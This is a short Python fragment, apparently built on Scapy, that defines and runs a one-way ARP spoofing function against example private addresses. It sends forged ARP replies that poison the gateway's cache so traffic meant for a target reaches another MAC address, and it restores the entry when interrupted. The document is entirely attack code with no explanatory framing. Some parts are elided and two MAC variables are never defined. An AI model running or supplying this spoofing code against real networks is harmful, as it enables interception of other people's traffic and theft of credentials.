...
def halfarpspoof(target, gateway, MAC):
    # sr()加上p在二层发送
    ...
    # 开始欺骗
    print('[*] Spoofing Gateway from {}'.format(target))
    while True:
        try:
            send(ARP(hwsrc=MAC, psrc=target,
                     hwdst=gatewaymac, pdst=gateway, op=2), verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            # 开始恢复网络到欺骗前的状态
            print('[*] Restoring {} to Gateway'.format(target))
            send(ARP(hwsrc=targetmac, psrc=target,
                     hwdst=gatewaymac, pdst=gateway, op=2), verbose=False)
            print('Completed')
            break


halfarpspoof('192.168.176.130', '192.168.176.2', '00:0c:29:a8:6f:71')
